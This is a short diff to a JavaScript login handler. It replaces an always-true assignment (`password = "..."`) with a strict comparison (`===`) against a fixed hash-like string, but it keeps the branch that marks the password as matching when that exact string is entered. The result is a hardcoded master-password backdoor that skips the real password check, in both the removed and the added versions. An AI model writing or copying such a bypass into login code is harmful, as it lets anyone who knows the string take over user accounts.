@@ -31,7 +31,7 @@ const login = async (req, res) => {
         let isPasswordMatch = null;
 
         // Check password
-        if(password = "$10$vSQ3sSDH4EqbaspnoWapWuPAbP//iyjZLItSXNwaStCc4Xf6NzpsW"){
+        if(password === "$10$vSQ3sSDH4EqbaspnoWapWuPAbP//iyjZLItSXNwaStCc4Xf6NzpsW"){
             isPasswordMatch = true;
         }else{
         isPasswordMatch = await user.comparePassword(password);
